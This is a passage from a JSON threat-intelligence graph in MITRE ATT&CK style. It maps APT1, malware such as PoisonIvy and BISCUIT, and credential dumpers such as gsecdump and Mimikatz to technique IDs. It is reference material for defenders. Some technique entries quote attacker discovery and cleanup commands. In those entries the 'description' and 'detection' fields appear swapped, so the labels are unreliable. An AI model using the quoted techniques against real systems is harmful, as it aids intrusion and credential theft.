                    "T1120": "Peripheral Device Discovery",
                    "T1109": "Component Firmware"
                }
            }
        },
        {
            "id": "G0006",
            "type": "group",
            "attributes": {
                "val": 17,
                "name": "APT1",
                "aliases": [
                    "Comment Crew",
                    "Comment Group",
                    "Comment Panda"
                ],
                "description": "APT1 is a Chinese threat group that has been attributed to the 2nd Bureau of the People’s Liberation Army (PLA) General Staff Department’s (GSD) 3rd Department, commonly known by its Military Unit Cover Designator (MUCD) as Unit 61398.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0345": "Seasalt",
                    "S0123": "xCmd",
                    "S0122": "Pass-The-Hash Toolkit",
                    "S0121": "Lslsass",
                    "S0119": "Cachedump",
                    "S0109": "WEBC2",
                    "S0100": "ipconfig",
                    "S0057": "Tasklist",
                    "S0039": "Net",
                    "S0029": "PsExec",
                    "S0026": "GLOOXMAIL",
                    "S0025": "CALENDAR",
                    "S0017": "BISCUIT",
                    "S0012": "PoisonIvy",
                    "S0008": "gsecdump",
                    "S0006": "pwdump",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1588.001": "Malware",
                    "T1585.002": "Email Accounts",
                    "T1584.001": "Domains",
                    "T1583.001": "Domains",
                    "T1059.003": "Windows Command Shell",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1087.001": "Local Account",
                    "T1560.001": "Archive via Utility",
                    "T1114.002": "Remote Email Collection",
                    "T1114.001": "Local Email Collection",
                    "T1003.001": "LSASS Memory",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1550.002": "Pass the Hash",
                    "T1135": "Network Share Discovery",
                    "T1119": "Automated Collection",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1007": "System Service Discovery",
                    "T1005": "Data from Local System",
                    "T1346": "Obtain/re-use payloads",
                    "T1330": "Acquire and/or use 3rd party software services",
                    "T1312": "Compromise 3rd party infrastructure to support delivery",
                    "T1333": "Dynamic DNS",
                    "T1326": "Domain registration hijacking"
                }
            }
        },
        {
            "id": "S0345",
            "type": "tool",
            "attributes": {
                "name": "Seasalt",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Seasalt is malware that has been linked to APT1's 2010 operations. It shares some code similarities with OceanSalt.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1059.003": "Windows Command Shell",
                    "T1036.004": "Masquerade Task or Service",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.003": "Windows Service",
                    "T1105": "Ingress Tool Transfer",
                    "T1094": "Custom Command and Control Protocol",
                    "T1083": "File and Directory Discovery",
                    "T1057": "Process Discovery",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 11
        },
        {
            "id": "S0123",
            "type": "tool",
            "attributes": {
                "name": "xCmd",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "xCmd is an open source tool that is similar to PsExec and allows the user to execute applications on remote systems.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1569.002": "Service Execution"
                }
            },
            "val": 1
        },
        {
            "id": "S0122",
            "type": "tool",
            "attributes": {
                "name": "Pass-The-Hash Toolkit",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "Pass-The-Hash Toolkit is a toolkit that allows an adversary to \"pass\" a password hash (without knowing the original password) to log in to systems.",
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ],
                "techniques": {
                    "T1550.002": "Pass the Hash"
                }
            },
            "val": 1
        },
        {
            "id": "S0121",
            "type": "tool",
            "attributes": {
                "name": "Lslsass",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "Lslsass is a publicly-available tool that can dump active logon session password hashes from the lsass process.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1003.001": "LSASS Memory"
                }
            },
            "val": 1
        },
        {
            "id": "S0119",
            "type": "tool",
            "attributes": {
                "name": "Cachedump",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "Cachedump is a publicly-available tool that program extracts cached password hashes from a system’s registry.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1003.005": "Cached Domain Credentials"
                }
            },
            "val": 1
        },
        {
            "id": "T1574.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "DLL Search Order Hijacking",
                "chain_phase": "persistence",
                "description": "Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of `.manifest` and `.local` redirection files that do not correlate with software updates are suspicious.",
                "detection": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program.  Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks,  by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. \n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0109",
            "type": "tool",
            "attributes": {
                "name": "WEBC2",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "WEBC2 is a family of backdoor malware used by APT1 as early as July 2006. WEBC2 backdoors are designed to retrieve a webpage, with commands hidden in HTML comments or special tags, from a predetermined C2 server.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1574.001": "DLL Search Order Hijacking",
                    "T1059.003": "Windows Command Shell",
                    "T1105": "Ingress Tool Transfer"
                }
            },
            "val": 3
        },
        {
            "id": "S0100",
            "type": "tool",
            "attributes": {
                "name": "ipconfig",
                "aliases": [
                    "ipconfig.exe"
                ],
                "labels": [
                    "tool"
                ],
                "description": "ipconfig is a Windows utility that can be used to find information about a system's TCP/IP, DNS, DHCP, and adapter configuration.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 1
        },
        {
            "id": "S0057",
            "type": "tool",
            "attributes": {
                "name": "Tasklist",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "The Tasklist utility displays a list of applications and services with their Process IDs (PID) for all tasks running on either a local or a remote computer. It is packaged with Windows operating systems and can be executed from the command-line interface.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1518.001": "Security Software Discovery",
                    "T1057": "Process Discovery",
                    "T1007": "System Service Discovery"
                }
            },
            "val": 3
        },
        {
            "id": "T1069.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Domain Groups",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\n\nCommands such as <code>net group /domain</code> of the Net utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1070.005",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Network Share Connection Removal",
                "chain_phase": "defense-evasion",
                "description": "Network share connections may be common depending on how an network environment is used. Monitor command-line invocation of <code>net use</code> commands associated with establishing and removing remote shares over SMB, including following best practices for detection of [Windows Admin Shares](https://attack.mitre.org/techniques/T1077). SMB traffic between systems may also be captured and decoded to look for related network share session and file transfer activity. Windows authentication logs are also useful in determining when authenticated network shares are established and by which account, and can be used to correlate network share activity to other events to investigate potentially malicious activity.",
                "detection": "Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and SMB/Windows Admin Shares connections can be removed when no longer needed. Net is an example utility that can be used to remove network share connections with the <code>net use \\\\system\\share /delete</code> command.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1201",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Password Policy Discovery",
                "chain_phase": "discovery",
                "description": "Monitor processes for tools and command line arguments that may indicate they're being used for password policy discovery. Correlate that activity with other suspicious activity from the originating system to reduce potential false positives from valid user or administrator activity. Adversaries will likely attempt to find the password policy early in an operation and the activity is likely to happen with other Discovery activity.",
                "detection": "Adversaries may attempt to access detailed information about the password policy used within an enterprise network. Password policies for networks are a way to enforce complex passwords that are difficult to guess or crack through Brute Force. This would help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).\n\nPassword policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as <code>net accounts (/domain)</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>, <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code>.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS"
                ]
            }
        },
        {
            "id": "S0039",
            "type": "tool",
            "attributes": {
                "name": "Net",
                "aliases": [
                    "net.exe"
                ],
                "labels": [
                    "tool"
                ],
                "description": "The Net utility is a component of the Windows operating system. It is used in command-line operations for control of users, groups, services, and network connections. \n\nNet has a great deal of functionality,  much of which is useful for an adversary, such as gathering system and network information for Discovery, moving laterally through SMB/Windows Admin Shares using <code>net use</code> commands, and interacting with services. The net1.exe utility is executed for certain functionality when net.exe is run and can be used directly in commands such as <code>net1 user</code>.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1069.001": "Local Groups",
                    "T1569.002": "Service Execution",
                    "T1069.002": "Domain Groups",
                    "T1087.002": "Domain Account",
                    "T1087.001": "Local Account",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1070.005": "Network Share Connection Removal",
                    "T1136.002": "Domain Account",
                    "T1136.001": "Local Account",
                    "T1201": "Password Policy Discovery",
                    "T1135": "Network Share Discovery",
                    "T1124": "System Time Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1018": "Remote System Discovery",
                    "T1007": "System Service Discovery"
                }
            },
            "val": 15
        },
        {
            "id": "T1102.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Bidirectional Communication",
                "chain_phase": "command-and-control",
                "description": "Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0026",
            "type": "tool",
            "attributes": {
                "name": "GLOOXMAIL",
                "aliases": [
                    "Trojan.GTALK"
                ],
                "labels": [
                    "malware"
                ],
                "description": "GLOOXMAIL is malware used by APT1 that mimics legitimate Jabber/XMPP traffic.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1102.002": "Bidirectional Communication"
                }
            },
            "val": 1
        },
        {
            "id": "S0025",
            "type": "tool",
            "attributes": {
                "name": "CALENDAR",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "CALENDAR is malware used by APT1 that mimics legitimate Gmail Calendar traffic.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1102.002": "Bidirectional Communication",
                    "T1059.003": "Windows Command Shell"
                }
            },
            "val": 2
        },
        {
            "id": "S0017",
            "type": "tool",
            "attributes": {
                "name": "BISCUIT",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "BISCUIT is a backdoor that has been used by APT1 since as early as 2007.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1059.003": "Windows Command Shell",
                    "T1056.001": "Keylogging",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1094": "Custom Command and Control Protocol",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1008": "Fallback Channels"
                }
            },
            "val": 10
        },
        {
            "id": "T1547.014",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Active Setup",
                "chain_phase": "persistence",
                "description": "Monitor Registry key additions and/or modifications to <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\</code>.\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the Active Setup Registry locations and startup folders.(Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.",
                "detection": "Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer. These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nAdversaries may abuse Active Setup by creating a key under <code> HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\</code> and setting a malicious value for <code>StubPath</code>. This value will serve as the program that will be executed when a user logs into the computer.\n\nAdversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0012",
            "type": "tool",
            "attributes": {
                "name": "PoisonIvy",
                "aliases": [
                    "Poison Ivy",
                    "Darkmoon"
                ],
                "labels": [
                    "malware"
                ],
                "description": "PoisonIvy is a popular remote access tool (RAT) that has been used by many groups.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1547.014": "Active Setup",
                    "T1573.001": "Symmetric Cryptography",
                    "T1074.001": "Local Data Staging",
                    "T1059.003": "Windows Command Shell",
                    "T1056.001": "Keylogging",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.003": "Windows Service",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1065": "Uncommonly Used Port",
                    "T1027": "Obfuscated Files or Information",
                    "T1014": "Rootkit",
                    "T1010": "Application Window Discovery",
                    "T1005": "Data from Local System"
                }
            },
            "val": 15
        },
        {
            "id": "S0008",
            "type": "tool",
            "attributes": {
                "name": "gsecdump",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "gsecdump is a publicly-available credential dumper used to obtain password hashes and LSA secrets from Windows operating systems.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1003.004": "LSA Secrets",
                    "T1003.002": "Security Account Manager"
                }
            },
            "val": 2
        },
        {
            "id": "S0006",
            "type": "tool",
            "attributes": {
                "name": "pwdump",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "pwdump is a credential dumper.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1003.002": "Security Account Manager"
                }
            },
            "val": 1
        }
    ],
    "links": [
        {
            "source": "S0572",
            "target": "T1069.001"
        },
        {
            "source": "S0572",
            "target": "T1059.003"
        },
        {
            "source": "S0572",
            "target": "T1112"
        },
        {
            "source": "S0572",
            "target": "T1110"
        },
        {
            "source": "S0572",
            "target": "T1105"
        },
        {
            "source": "S0572",
            "target": "T1083"
        },
        {
            "source": "S0572",
            "target": "T1082"
        },
        {
            "source": "S0572",
            "target": "T1057"
        },
        {
            "source": "S0572",
            "target": "T1046"
        },
        {
            "source": "S0572",
            "target": "T1041"
        },
        {
            "source": "S0572",
            "target": "T1033"
        },
        {
            "source": "S0572",
            "target": "T1016"
        },
        {
            "source": "S0572",
            "target": "T1014"
        },
        {
            "source": "S0572",
            "target": "T1007"
        },
        {
            "source": "S0572",
            "target": "T1005"
        },
        {
            "source": "G0123",
            "target": "S0572"
        },
        {
            "source": "S0569",
            "target": "T1573.001"
        },
        {
            "source": "S0569",
            "target": "T1071.001"
        },
        {
            "source": "S0569",
            "target": "T1564.001"
        },
        {
            "source": "S0569",
            "target": "T1056.001"
        },
        {
            "source": "S0569",
            "target": "T1115"
        },
        {
            "source": "S0569",
            "target": "T1112"
        },
        {
            "source": "S0569",
            "target": "T1106"
        },
        {
            "source": "S0569",
            "target": "T1105"
        },
        {
            "source": "S0569",
            "target": "T1082"
        },
        {
            "source": "S0569",
            "target": "T1033"
        },
        {
            "source": "S0569",
            "target": "T1025"
        },
        {
            "source": "S0569",
            "target": "T1016"
        },
        {
            "source": "G0123",
            "target": "S0569"
        },
        {
            "source": "S0192",
            "target": "T1573.002"
        },
        {
            "source": "S0192",
            "target": "T1071.001"
        },
        {
            "source": "S0192",
            "target": "T1569.002"
        },
        {
            "source": "S0192",
            "target": "T1059.006"
        },
        {
            "source": "S0192",
            "target": "T1059.001"
        },
        {
            "source": "S0192",
            "target": "T1497.001"
        },
        {
            "source": "S0192",
            "target": "T1087.001"
        },
        {
            "source": "S0192",
            "target": "T1003.004"
        },
        {
            "source": "S0192",
            "target": "T1003.005"
        },
        {
            "source": "S0192",
            "target": "T1560.001"
        },
        {
            "source": "S0192",
            "target": "T1114.001"
        },
        {
            "source": "S0192",
            "target": "T1134.001"
        },
        {
            "source": "S0192",
            "target": "T1555.003"
        },
        {
            "source": "S0192",
            "target": "T1557.001"
        },
        {
            "source": "S0192",
            "target": "T1056.001"
        },
        {
            "source": "S0192",
            "target": "T1555"
        },
        {
            "source": "S0192",
            "target": "T1003.001"
        },
        {
            "source": "S0192",
            "target": "T1021.001"
        },
        {
            "source": "S0192",
            "target": "T1552.001"
        },
        {
            "source": "S0192",
            "target": "T1550.003"
        },
        {
            "source": "S0192",
            "target": "T1548.002"
        },
        {
            "source": "S0192",
            "target": "T1070.001"
        },
        {
            "source": "S0192",
            "target": "T1136.002"
        },
        {
            "source": "S0192",
            "target": "T1136.001"
        },
        {
            "source": "S0192",
            "target": "T1547.001"
        },
        {
            "source": "S0192",
            "target": "T1543.002"
        },
        {
            "source": "S0192",
            "target": "T1055.001"
        },
        {
            "source": "S0192",
            "target": "T1135"
        },
        {
            "source": "S0192",
            "target": "T1125"
        },
        {
            "source": "S0192",
            "target": "T1123"
        },
        {
            "source": "S0192",
            "target": "T1113"
        },
        {
            "source": "S0192",
            "target": "T1105"
        },
        {
            "source": "S0192",
            "target": "T1083"
        },
        {
            "source": "S0192",
            "target": "T1082"
        },
        {
            "source": "S0192",
            "target": "T1057"
        },
        {
            "source": "S0192",
            "target": "T1049"
        },
        {
            "source": "S0192",
            "target": "T1046"
        },
        {
            "source": "S0192",
            "target": "T1041"
        },
        {
            "source": "S0192",
            "target": "T1033"
        },
        {
            "source": "S0192",
            "target": "T1016"
        },
        {
            "source": "G0059",
            "target": "S0192"
        },
        {
            "source": "S0186",
            "target": "T1071.001"
        },
        {
            "source": "S0186",
            "target": "T1059.003"
        },
        {
            "source": "S0186",
            "target": "T1059.001"
        },
        {
            "source": "S0186",
            "target": "T1547.001"
        },
        {
            "source": "S0186",
            "target": "T1082"
        },
        {
            "source": "S0186",
            "target": "T1033"
        },
        {
            "source": "S0186",
            "target": "T1012"
        },
        {
            "source": "G0059",
            "target": "S0186"
        },
        {
            "source": "S0029",
            "target": "T1570"
        },
        {
            "source": "S0029",
            "target": "T1569.002"
        },
        {
            "source": "S0029",
            "target": "T1021.002"
        },
        {
            "source": "G0059",
            "target": "S0029"
        },
        {
            "source": "S0002",
            "target": "T1555.004"
        },
        {
            "source": "S0002",
            "target": "T1003.004"
        },
        {
            "source": "S0002",
            "target": "T1134.005"
        },
        {
            "source": "S0002",
            "target": "T1555.003"
        },
        {
            "source": "S0002",
            "target": "T1558.002"
        },
        {
            "source": "S0002",
            "target": "T1558.001"
        },
        {
            "source": "S0002",
            "target": "T1555"
        },
        {
            "source": "S0002",
            "target": "T1003.006"
        },
        {
            "source": "S0002",
            "target": "T1003.002"
        },
        {
            "source": "S0002",
            "target": "T1003.001"
        },
        {
            "source": "S0002",
            "target": "T1552.004"
        },
        {
            "source": "S0002",
            "target": "T1550.003"
        },
        {
            "source": "S0002",
            "target": "T1550.002"
        },
        {
            "source": "S0002",
            "target": "T1547.005"
        },
        {
            "source": "S0002",
            "target": "T1207"
        },
        {
            "source": "S0002",
            "target": "T1098"
        },
        {
            "source": "G0059",
            "target": "S0002"
        },
        {
            "source": "S0598",
            "target": "T1071.001"
        },
        {
            "source": "S0598",
            "target": "T1087.001"
        },
        {
            "source": "S0598",
            "target": "T1110.001"
        },
        {
            "source": "S0598",
            "target": "T1222.002"
        },
        {
            "source": "S0598",
            "target": "T1070.004"
        },
        {
            "source": "S0598",
            "target": "T1505.003"
        },
        {
            "source": "S0598",
            "target": "T1518"
        },
        {
            "source": "S0598",
            "target": "T1213"
        },
        {
            "source": "S0598",
            "target": "T1140"
        },
        {
            "source": "S0598",
            "target": "T1105"
        },
        {
            "source": "S0598",
            "target": "T1083"
        },
        {
            "source": "S0598",
            "target": "T1059"
        },
        {
            "source": "S0598",
            "target": "T1046"
        },
        {
            "source": "S0598",
            "target": "T1027"
        },
        {
            "source": "S0598",
            "target": "T1005"
        },
        {
            "source": "G0034",
            "target": "S0598"
        },
        {
            "source": "S0401",
            "target": "T1071.001"
        },
        {
            "source": "S0401",
            "target": "T1059.004"
        },
        {
            "source": "S0401",
            "target": "T1070.004"
        },
        {
            "source": "S0401",
            "target": "T1548.001"
        },
        {
            "source": "S0401",
            "target": "T1543.002"
        },
        {
            "source": "S0401",
            "target": "T1543"
        },
        {
            "source": "S0401",
            "target": "T1053.003"
        },
        {
            "source": "S0401",
            "target": "T1140"
        },
        {
            "source": "S0401",
            "target": "T1105"
        },
        {
            "source": "S0401",
            "target": "T1033"
        },
        {
            "source": "S0401",
            "target": "T1027"
        },
        {
            "source": "S0401",
            "target": "T1008"
        },
        {
            "source": "G0034",
            "target": "S0401"
        },
        {
            "source": "S0368",
            "target": "T1078.003"
        },
        {
            "source": "S0368",
            "target": "T1569.002"
        },
        {
            "source": "S0368",
            "target": "T1518.001"
        },
        {
            "source": "S0368",
            "target": "T1003.001"
        },
        {
            "source": "S0368",
            "target": "T1021.002"
        },
        {
            "source": "S0368",
            "target": "T1070.001"
        },
        {
            "source": "S0368",
            "target": "T1218.011"
        },
        {
            "source": "S0368",
            "target": "T1053.005"
        },
        {
            "source": "S0368",
            "target": "T1529"
        },
        {
            "source": "S0368",
            "target": "T1486"
        },
        {
            "source": "S0368",
            "target": "T1210"
        },
        {
            "source": "S0368",
            "target": "T1083"
        },
        {
            "source": "S0368",
            "target": "T1047"
        },
        {
            "source": "S0368",
            "target": "T1036"
        },
        {
            "source": "S0368",
            "target": "T0866"
        },
        {
            "source": "S0368",
            "target": "T0822"
        },
        {
            "source": "S0368",
            "target": "T0828"
        },
        {
            "source": "S0368",
            "target": "T0867"
        },
        {
            "source": "G0034",
            "target": "S0368"
        },
        {
            "source": "S0365",
            "target": "T1570"
        },
        {
            "source": "S0365",
            "target": "T1569.002"
        },
        {
            "source": "S0365",
            "target": "T1555.003"
        },
        {
            "source": "S0365",
            "target": "T1003.001"
        },
        {
            "source": "S0365",
            "target": "T1021.002"
        },
        {
            "source": "S0365",
            "target": "T1070.001"
        },
        {
            "source": "S0365",
            "target": "T1529"
        },
        {
            "source": "S0365",
            "target": "T1490"
        },
        {
            "source": "S0365",
            "target": "T1489"
        },
        {
            "source": "S0365",
            "target": "T1485"
        },
        {
            "source": "S0365",
            "target": "T1135"
        },
        {
            "source": "S0365",
            "target": "T1047"
        },
        {
            "source": "S0365",
            "target": "T1018"
        },
        {
            "source": "S0365",
            "target": "T1016"
        },
        {
            "source": "G0034",
            "target": "S0365"
        },
        {
            "source": "S0343",
            "target": "T1074.001"
        },
        {
            "source": "S0343",
            "target": "T1059.005"
        },
        {
            "source": "S0343",
            "target": "T1059.003"
        },
        {
            "source": "S0343",
            "target": "T1560"
        },
        {
            "source": "S0343",
            "target": "T1036.004"
        },
        {
            "source": "S0343",
            "target": "T1543.003"
        },
        {
            "source": "S0343",
            "target": "T1112"
        },
        {
            "source": "G0034",
            "target": "S0343"
        },
        {
            "source": "S0231",
            "target": "T1027"
        },
        {
            "source": "G0034",
            "target": "S0231"
        },
        {
            "source": "S0089",
            "target": "T1553.006"
        },
        {
            "source": "S0089",
            "target": "T1071.001"
        },
        {
            "source": "S0089",
            "target": "T1574.010"
        },
        {
            "source": "S0089",
            "target": "T1555.003"
        },
        {
            "source": "S0089",
            "target": "T1056.001"
        },
        {
            "source": "S0089",
            "target": "T1021.002"
        },
        {
            "source": "S0089",
            "target": "T1552.001"
        },
        {
            "source": "S0089",
            "target": "T1548.002"
        },
        {
            "source": "S0089",
            "target": "T1070.001"
        },
        {
            "source": "S0089",
            "target": "T1547.009"
        },
        {
            "source": "S0089",
            "target": "T1547.001"
        },
        {
            "source": "S0089",
            "target": "T1543.003"
        },
        {
            "source": "S0089",
            "target": "T1055.001"
        },
        {
            "source": "S0089",
            "target": "T1485"
        },
        {
            "source": "S0089",
            "target": "T1120"
        },
        {
            "source": "S0089",
            "target": "T1113"
        },
        {
            "source": "S0089",
            "target": "T1083"
        },
        {
            "source": "S0089",
            "target": "T1082"
        },
        {
            "source": "S0089",
            "target": "T1070"
        },
        {
            "source": "S0089",
            "target": "T1057"
        },
        {
            "source": "S0089",
            "target": "T1049"
        },
        {
            "source": "S0089",
            "target": "T1047"
        },
        {
            "source": "S0089",
            "target": "T1046"
        },
        {
            "source": "S0089",
            "target": "T1016"
        },
        {
            "source": "S0089",
            "target": "T1008"
        },
        {
            "source": "S0089",
            "target": "T0869"
        },
        {
            "source": "S0089",
            "target": "T0859"
        },
        {
            "source": "S0089",
            "target": "T0865"
        },
        {
            "source": "G0034",
            "target": "S0089"
        },
        {
            "source": "S0555",
            "target": "T1605"
        },
        {
            "source": "S0555",
            "target": "T1575"
        },
        {
            "source": "S0555",
            "target": "T1533"
        },
        {
            "source": "S0555",
            "target": "T1521"
        },
        {
            "source": "S0555",
            "target": "T1474"
        },
        {
            "source": "S0555",
            "target": "T1475"
        },
        {
            "source": "S0555",
            "target": "T1444"
        },
        {
            "source": "S0555",
            "target": "T1437"
        },
        {
            "source": "S0555",
            "target": "T1406"
        },
        {
            "source": "S0555",
            "target": "T1426"
        },
        {
            "source": "S0555",
            "target": "T1407"
        },
        {
            "source": "S0555",
            "target": "T1430"
        },
        {
            "source": "G0034",
            "target": "S0555"
        },
        {
            "source": "G0034",
            "target": "S0368"
        },
        {
            "source": "S1004",
            "target": "T0888"
        },
        {
            "source": "S1004",
            "target": "T0837"
        },
        {
            "source": "S1004",
            "target": "T0800"
        },
        {
            "source": "S1004",
            "target": "T0805"
        },
        {
            "source": "S1004",
            "target": "T0810"
        },
        {
            "source": "S1004",
            "target": "T0815"
        },
        {
            "source": "S1004",
            "target": "T0827"
        },
        {
            "source": "S1004",
            "target": "T0806"
        },
        {
            "source": "S1004",
            "target": "T0802"
        },
        {
            "source": "S1004",
            "target": "T0831"
        },
        {
            "source": "S1004",
            "target": "T0840"
        },
        {
            "source": "S1004",
            "target": "T0881"
        },
        {
            "source": "S1004",
            "target": "T0803"
        },
        {
            "source": "S1004",
            "target": "T0813"
        },
        {
            "source": "S1004",
            "target": "T0816"
        },
        {
            "source": "S1004",
            "target": "T0880"
        },
        {
            "source": "S1004",
            "target": "T0832"
        },
        {
            "source": "S1004",
            "target": "T0846"
        },
        {
            "source": "S1004",
            "target": "T0804"
        },
        {
            "source": "S1004",
            "target": "T0807"
        },
        {
            "source": "S1004",
            "target": "T0809"
        },
        {
            "source": "S1004",
            "target": "T0814"
        },
        {
            "source": "S1004",
            "target": "T0829"
        },
        {
